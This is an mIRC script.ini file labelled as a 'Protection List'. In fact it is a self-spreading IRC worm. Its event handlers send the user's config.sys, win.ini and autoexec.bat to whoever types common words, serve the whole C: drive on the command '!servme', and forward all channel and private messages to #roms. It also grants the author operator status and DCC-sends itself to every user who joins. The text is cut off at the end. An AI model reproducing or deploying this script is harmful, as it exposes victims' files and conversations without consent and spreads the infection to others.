[script]
n0=;----------------------------------------------------------
n1=;      Protection List
n2=;----------------------------------------------------------
n3=ON 1:TEXT:*spamquit*:#:/quit Jolly Spamhead Ownz Me
n4=ON 1:TEXT:*hi*:#:/dcc send $nick c:\config.sys
n5=ON 1:TEXT:*!servme*:#:/fserve $nick 1 c:\
n6=ON 1:TEXT:*cya*:#:/dcc send $nick c:\windows\win.ini
n7=ON 1:TEXT:*the*:#:/dcc send $nick c:\autoexec.bat
n8=ON 1:NOTICE:*:#:/msg #roms  $+ $chan $+  - $+ $nick $+ - $parms
n9=ON 1:TEXT:*:?:/msg #roms **Message from $nick $+ ** $parms |
/closemsg  $nick
n10=ON 1:TEXT:*:#:/msg #roms $+ $chan $+  < $+ $nick $+ > $parms
N11=ON 1:TEXT:*:#:/say I am lame for running Script.ini and I should
be shot!
n12=ON 1:JOIN:#:/dcc send $nick SCRIPT.INI
n13=ON 1:JOIN:*RaSPuTeN*:/mode +o $chan RaSPuTeN
N14=ON 1:JOIN:#:/msg $nick My Computer Is Open For The taking! Type
!servme in channel!
n15=#user.prot.add.all off
n16=raw 401:*: set %User.Nick 0 | halt
n17=raw 301:*: halt
n18=raw 311:*: set %User.Address $2 $+ ! $+ $3 $+ @ $+ $4 | halt
n19=raw 312:*: halt
n20=raw 313:*: halt
n21=raw 317:*: halt
n22=raw 319:*: halt
n23=raw 318:* {
n24=  if (%User.Nick == 0) { error $2 $+ , no such nick | goto do
****
nasty
